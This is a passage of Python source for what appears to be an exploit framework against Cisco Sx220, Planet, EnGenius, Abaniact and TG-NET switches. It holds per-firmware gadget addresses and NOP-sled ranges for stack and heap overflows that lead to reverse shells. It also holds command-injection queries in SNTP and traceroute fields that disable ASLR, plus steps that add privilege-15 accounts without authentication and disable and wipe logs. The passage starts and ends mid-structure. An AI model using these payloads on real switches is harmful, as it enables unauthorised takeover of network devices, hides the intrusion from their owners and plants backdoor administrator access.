														# /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
						'log_ramClear':0x41DA94,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi/set.cgi; cgi_log_clear_set()
						'log_fileClear':0x41DA94,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSntp_set':0x415F14,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject RCE)
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSntpDel_set':0x415F14,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
						'sys_timeSettings_set':0x415F14,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': False,			# 
					}, 
					'heack_cgi_shell': {
						'cgi':'set.cgi',				# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
						'START':0x7ffeff04,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'usr_nop': 64,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 77,					# filler/garbage (not used for something constructive)
						'align': 3,						# Align opcodes in memory
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

			#
			# Abaniact
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : No
			# Del /mntlog/flash.log  : No
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'222-45866': {
				'template':'Abaniact',					# Static for the vendor
				'version':'116B00033',				# Version / binary dependent stuff
				'model':'AML2-PS16-17GP L2',			# Model
				'uri':'https://www.abaniact.com/L2SW/',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40E65C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f998524,			# la $t9, system) # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x2484152c,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_diag': {
						# Ping IPv4
						#'sys_ping_post_cmd':'ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space&count=1',
						#'verify_uri':'/tmp/pingtest_tmp',
						#'web_sys_ping_post':0x4296FC,	# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_ping_post()

						# traceroute
						'web_sys_ping_post':0x429F58,	# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_sys_trace_route_post()
						'sys_ping_post_cmd':'ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space;cat /proc/sys/kernel/randomize_va_space > /tmp/traceroute_tmp #&tr_maxhop=30&count=1',
						'verify_uri':'/tmp/traceroute_tmp',
						'vulnerable': True,
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
						'log_settings_set':0x4B4FE4,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_ramClear':0x4BA5D0,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_fileClear':0x4BA5D0,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)
						'vulnerable': True,
					},
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
					'stack_cgi_sntp': {
						'sys_timeSntp_set':0x43764C,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject CMD)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntpDel_set':0x43764C,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
						'sys_timeSettings_set':0x431CC4,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)
						'vulnerable': False,
					}, 
					'heack_cgi_shell': {
						'cgi':'dispatcher.cgi',			# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
						'query':'username=admin&password=_PWDNOP_RA_START&login=1&shellcod=_USRNOP_USRNOP_USRNOP_SHELLCODE',
						'START':0x7ffe6e04,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP':0x7fc60000,				# end: You may want to play with this if you dont get it working
						'stack':True,					# NOP and shellcode lays on: True = stack, False = Heap
						'usr_nop': 53,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 45,					# filler/garbage (not used for something constructive)
						'align': 0,						# Align opcodes in memory
						'vulnerable': True,
						'workaround':True,	# My LAB workaround

					},
				},
			},

			#
			# TG-NET Botone Technology Co.,Ltd.
			# (Traces in this image: 3One Data Communication, Saitian, Sangfor, Sundray, Gigamedia, GetCK, Hanming Technology)
			#
			# CGI Reverse Shell      : Yes
			# Boa/Hydra reverse shell: Yes
			# Del /var/log/ram.log   : Yes
			# Del /var/log/flash.log : No
			# Del /mntlog/flash.log  : No
			# Add credentials        : Yes
			# Del credentials        : Yes
			#
			'222-81176': {
				'template':'TG-NET',					# Static for the vendor
				'version':'3.1.1-R1',					# Version / binary dependent stuff
				'model':'P3026M-24POE (V3)',				# Model
				'uri':'http://www.tg-net.net/productshow.asp?ProdNum=1049&parentid=98',
				'exploit': {
					'heack_hydra_shell': {
														# /sqfs/bin/boa; embedparse() 
						'gadget': 0x40C74C,				# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
														# /sqfs/bin/boa; read_body(); 
						'system': 0x8f99851c,			# la $t9, system) # opcode, binary dependent
														# /sqfs/bin/boa; read_body(); 
						'handler': 0x2484a2d4,			# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
						'v0': 7,						# Should leave as-is (but you can play between 5 - 8)
						'vulnerable': True,
					},
					'stack_cgi_diag': {
						'vulnerable': False,
					},
					'stack_cgi_add_account': {
						'vulnerable': False,
					},
					'stack_cgi_del_account': { #
						'vulnerable': False,
					},
					'stack_cgi_log': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
						'log_settings_set':0x46AC10,	# Jump one after 'sw $ra'			# Disable Logging (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_ramClear':0x46E368,		# Jump one after 'sw $ra'			# Clean RAM log (address, binary dependent)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
						'log_fileClear':0x46E368,		# Jump one after 'sw $ra'			# Clean FILE log (address, binary dependent)

						'vulnerable': True,
					},
					'stack_cgi_sntp': {
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntp_set':0x42243C,	# Jump one after 'sw $ra'			# Set SNTP Server (Inject CMD)
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
						'sys_timeSntpDel_set':0x42243C,	# Jump one after 'sw $ra'			# Delete (address, binary dependent) 
														# /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
						'sys_timeSettings_set':0x424DE0,# Jump one after 'sw $ra'			# Enable/Disable (address, binary dependent)

						'vulnerable':False,
					}, 

					# Interesting when there is a fresh heap with 0x00's (4 x 0x00 == MIPS NOP),
					# and to fill wider area with sending '&%8f%84%01=%8f%84%80%18' where:
					# 
					# NOP's
					# '24%04%FF=' : '=' will be replaced with 0x00, li $a0, 0xFFFFFF00
					# '%24%04%FF%FF' : li $a0, 0xFFFFFFFF
					'heack_cgi_shell': {
						'cgi':'dispatcher.cgi',			# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
						'query':'username='+ self.random_string(112) +'_RA_START&password='+ self.random_string(80) +'&login=1'+ ('&%24%04%FF=%24%04%FF%FF' * 50) +'_SHELLCODE',
						'START':0x10010104,				# start: Stack overflow RA, used for searching NOP sled by blind jump
						'STOP' :0x10600604,				# end: You may want to play with this if you dont get it working
						'usr_nop': 28,					# NOP sled (shellcode will be tailed)
						'pwd_nop': 20,					# filler/garbage (not used for something constructive)
						'align': 0,						# Align opcodes in memory
						'stack':False,					# NOP and shellcode lays on: True = stack, False = Heap
						'vulnerable': True,
					},
				},
			},

		}

		#
		# Vendor templates, Vendor_ETag() will be merged to here
		# (dont delete anything here thats not moved to Vendor_ETag())
		#

		Vendor_Template = {
			#
			'Planet': {
				'vendor': 'PLANET Technology Corp.',
				'modulus_uri':'',
				'info_leak':False,
				'info_leak_JSON':False,
				'info_leak_uri':'',
				'xsid':False,
				'xsid_uri':'',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':False,
					'encryption':'clear',
					'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
					'query':'username=USERNAME&password=PASSWORD&login=1',
					'status_uri':'/cgi-bin/dispatcher.cgi?cmd=547',
					'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
					'vulnerable': True,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':False,
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'LOGGING_SERVICE=0&cmd=5121',
						'status':'',
						'clean_logfile_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logfile_query':'cmd_5132=Clear+file+messages',
						'clean_logmem_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logmem_query':'cmd_5132=Clear+buffered+messages',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': {
						'httpuploadbakcfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload "backup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadbakcfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httpuploadruncfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadruncfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httprestorecfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httprestorecfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httpupload.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':'Image Signature Error',
							'vulnerable': True,
							'safe': True
						},
						'dispatcher.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'response':'502',
							'Content-Type':False,
							'authenticated': False,
							'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
							'content':'username=admin&password='+ self.random_string(184) + '&login=1',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'json':False,
						'authenticated': False,
						'encryption':'md5',
						'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" secret encrypted PASSWORD\n\n------',
						#'encryption':'nopassword',
						#'content':'Content-Type\n\nconfig-file-header\nusername "USERNAME" nopassword\n\n------', # Yep, working too
						'add_uri':'/cgi-bin/httpuploadruncfg.cgi',
						'del_query':'', 
						'del_uri':'/cgi-bin/dispatcher.cgi?cmd=526&usrName=USERNAME',
						'vulnerable': True,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':False,
						'authenticated': True,
						'enable_uri':'/cgi-bin/dispatcher.cgi',
						'enable_query':'sntp_enable=1&cmd=548',
						'status_uri':'/cgi/get.cgi?cmd=sys_timeSettings',
						'inject_uri':'/cgi-bin/dispatcher.cgi',
						'inject_query':'sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123&cmd=550',
						'check_query':'sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123&cmd=550',
						'delete_uri':'/cgi-bin/dispatcher.cgi',
						'delete_query':'sntp_Server=+&sntp_Port=123&cmd=550',
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'sntp_enable=0&cmd=548',
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,

						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(212) +'_JUMP_&password='+ self.random_string(180) +'&_CMD_&login=1',
						'sys_ping_post_check':'',
						'sys_ping_post_SIGSEGV': False,		# SIGSEGV ?

						'workaround':True,	# My LAB workaround

						'vulnerable': True,
						'safe': True

					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(212) +'_JUMP_&password='+ self.random_string(180) +'_CMD_&login=1',

						'log_settings_set_cmd':'&LOGGING_SERVICE=0',# Disable Logging CMD
						'log_settings_set_SIGSEGV':False,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'',						# Clean RAM log CMD
						'log_ramClear_SIGSEGV':False,				# Clean RAM log SIGSEGV ?

						'log_fileClear_cmd':'',						# Clean FILE log CMD
						'log_fileClear_SIGSEGV':False,				# Clean FILE log SIGSEGV ?

						'workaround':True,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(212) +'_JUMP_&password='+ self.random_string(180) +'_CMD_&login=1',

						'sys_timeSntp_set_cmd':'&sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123',
						'sys_timeSntp_set_check':'&sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123',

						'sys_timeSntpDel_set_cmd':'&sntp_Server=+&sntp_Port=123',

						'sys_timeSettings_set_cmd_enable':'&sntp_enable=1',
						'sys_timeSettings_set_cmd_disable':'&sntp_enable=0',
						'sys_timeSettings_set_SIGSEGV': False,		# SIGSEGV ?

						'workaround':True,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					}, 

					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
						'query':'username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&login=1',
						'workaround':True,	# My LAB workaround
						'stack':True, # False = use Heap, and there are no ASLR
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'Cisco': { 
				'vendor': 'Cisco Systems, Inc.',
				'model':'Sx220',
				'uri':'https://www.cisco.com/c/en/us/support/switches/small-business-220-series-smart-plus-switches/tsd-products-support-series-home.html',
				'modulus_uri':'/cgi/get.cgi?cmd=home_login',
				'info_leak':True,
				'info_leak_JSON':True,
				'info_leak_uri':'/cgi/get.cgi?cmd=home_login',
				'xsid':True,
				'xsid_uri':'/cgi/get.cgi?cmd=home_main',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'rsa',
					'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
					'query':'{"_ds=1&username=USERNAME&password=PASSWORD&_de=1":{}}',
					'status_uri':'/cgi/get.cgi?cmd=home_loginStatus',
					'logout_uri':'/cgi/set.cgi?cmd=home_logout',
					'vulnerable': True,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':True,
						'disable_uri':'/cgi/set.cgi?cmd=log_settings',
						'disable_query':'{"_ds=1&ram_sev_0=on&ram_sev_1=on&ram_sev_2=on&ram_sev_3=on&ram_sev_4=on&ram_sev_5=on&ram_sev_6=on&_de=1":{}}',
						'status':'/cgi/get.cgi?cmd=log_settings',
						'clean_logfile_uri':'/cgi/set.cgi?cmd=log_fileClear',
						'clean_logfile_query':'{"":{}}',
						'clean_logmem_uri':'/cgi/set.cgi?cmd=log_ramClear',
						'clean_logmem_query':'{"":{}}',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': { 
						'httpuploadbakcfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload "backup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httpuploadbakcfg.cgi',
							'check_uri':'/tmp/startup-config',
							'content':'/mnt/backup-config',
							'content_check':'/mnt/backup-config',
							'vulnerable': True,
							'safe': True
						},
						'httpuploadlang.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/update "language" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httpuploadlang.cgi',
							'check_uri':False,		# 
							'content': self.random_string(30), # We checking returned 'errMsgLangMG' and LEN of this text
							'content_check':'errMsgLangMG',	#
							'vulnerable': True,
							'safe': True
						},
						'httpuploadruncfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httpuploadruncfg.cgi',
							'check_uri':'/tmp/http_saverun_cfg',
							'content':'/var/config/running-config',
							'content_check':'/var/config/running-config',
							'vulnerable': True,
							'safe': True
						},
						'httprestorecfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httprestorecfg.cgi',
							'check_uri':'/tmp/startup-config',
							'content':'/mnt/startup-config',
							'content_check':'/mnt/startup-config',
							'vulnerable': True,
							'safe': True
						},
						'httpupload.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload.cgi',
							'check_uri':'/tmp/http_uploadfail',
							'content':'Copy: Illegal software format', # Not the real content, its the result of invalid firmware (workaround)
							'content_check':'Copy: Illegal software format',
							'vulnerable': True,
							'safe': True
						},
						'login.cgi': {
							'description':'Stack overflow in login.cgi (PoC: create file /tmp/VUL.TXT)',
							'authenticated': False,
							'response':'file',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'check_uri':'/tmp/VUL.TXT', # We cannot control the content...
							'content':'{"_ds=1&username='+ self.random_string(32) +'&password=/tmp/VUL.TXT&_de=1":{}}',
							'content_check':'2',
							'vulnerable': True,
							'safe': True
						},
						'set.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'content':'{"_ds=1&username=admin&password=' + self.random_string(312) + '&_de=1":{}}',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'authenticated': False,
						'json':True,
						'encryption':'md5',
						'content':'Content-Type\n\nconfig-file-header\nusername "USERNAME" secret encrypted PASSWORD\n\n------',
						#'encryption':'nopassword',
						#'content':'Content-Type\n\nconfig-file-header\nusername "USERNAME" nopassword\n\n------', # Yep, working too
						'add_uri':'/cgi/httpuploadruncfg.cgi',
						'del_query':'{"_ds=1&user=USERNAME&_de=1":{}}',
						'del_uri':'/cgi/set.cgi?cmd=aaa_userDel',
						'vulnerable': True,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':True,
						'authenticated': True,
						'enable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
						'enable_query':'{"_ds=1&sntpStatus=1&_de=1":{}}',
						'status_uri':'/cgi/get.cgi?cmd=sys_timeSettings',
						'inject_uri':'/cgi/set.cgi?cmd=sys_timeSntp',
						'inject_query':'{"_ds=1&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123&_de=1":{}}',
						'check_query':'{"_ds=1&srvDef=byIp&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123&_de=1":{}}',
						'delete_uri':'/cgi/set.cgi?cmd=sys_timeSntpDel',
						'delete_query':'{"":{}}',
						'disable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
						'disable_query':'{"_ds=1&sntpStatus=0&_de=1":{}}',
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,

						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
						'sys_ping_post_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True

					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',

						'log_settings_set_cmd':'',					# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'',						# Clean RAM CMD
						'log_ramClear_SIGSEGV':True,				# Clean RAM SIGSEGV ?

						'log_fileClear_cmd':'',						# Clean FILE log CMD
						'log_fileClear_SIGSEGV':True,				# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
						'sys_timeSntp_set_cmd':'&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123',
						'sys_timeSntp_set_check':'&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123',

						'sys_timeSntpDel_set_cmd':'&sntpServer=+&cursntpPort=123',				# CMD

						'sys_timeSettings_set_cmd_enable':'&sntpStatus=1',	# Enable CMD
						'sys_timeSettings_set_cmd_disable':'&sntpStatus=0',	# Disable CMD
						'sys_timeSettings_set_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					}, 
					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'logout_uri':'/cgi/set.cgi?cmd=home_logout',
						'query':'{"_ds=1&username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&_de=1":{}}',
						'stack':True, # False = use Heap, and there are no ASLR
						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'EnGenius': { 
				'vendor': 'EnGenius Technologies, Inc.',
				'modulus_uri':'',
				'info_leak':True,
				'info_leak_JSON':False,
				'info_leak_uri':'/loginMsg.js',
				'xsid':False,
				'xsid_uri':'',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'',
					'login_uri':'',
					'query':'',
					'status_uri':'',
					'logout_uri':'',
					'vulnerable': False,
					'safe': True
				},
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'',
					'login_uri':'',
					'query':'',
					'status_uri':'',
					'logout_uri':'',
					'vulnerable': False,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':True,
						'disable_uri':'',
						'disable_query':'',
						'status':'',
						'clean_logfile_uri':'',
						'clean_logfile_query':'',
						'clean_logmem_uri':'',
						'clean_logmem_query':'',
						'vulnerable': False,
						'safe': True
				},
				# Verify lacking authentication
				'verify': { 
						'security.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/security.cgi?login',
							'content':'usr=admin&pswrd=' + self.random_string(280),
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'datajson.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi-bin/datajson.cgi?login',
							'content':'usr=admin&pswrd=' + self.random_string(288),
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/sn_httpupload.cgi?', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'authenticated': False,
						'json':True,
						'encryption':'',
						'content':'',
						'add_uri':'',
						'del_query':'',
						'del_uri':'',
						'vulnerable': False,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':True,
						'authenticated': True,	# <================================
						'enable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
						'enable_query':'{"_ds=1&sntpStatus=1&_de=1":{}}',
						'status_uri':'/cgi/get.cgi?cmd=sys_timeSettings',
						'inject_uri':'/cgi/set.cgi?cmd=sys_timeSntp',
						'inject_query':'{"_ds=1&srvDef=byIp&sntpServer=`echo 0 > /proc/sys/kernel/randomize_va_space`&cursntpPort=123&_de=1":{}}',
						'check_query':'{"_ds=1&srvDef=byIp&sntpServer=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&cursntpPort=123&_de=1":{}}',
						'delete_uri':'/cgi/set.cgi?cmd=sys_timeSntpDel',
						'delete_query':'{"":{}}',
						'disable_uri':'/cgi/set.cgi?cmd=sys_timeSettings',
						'disable_query':'{"_ds=1&sntpStatus=0&_de=1":{}}',
						'verify_uri':'/tmp/check',
						'vulnerable': False, # It is vulnerable, but I am not using this authenticated code here :>
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
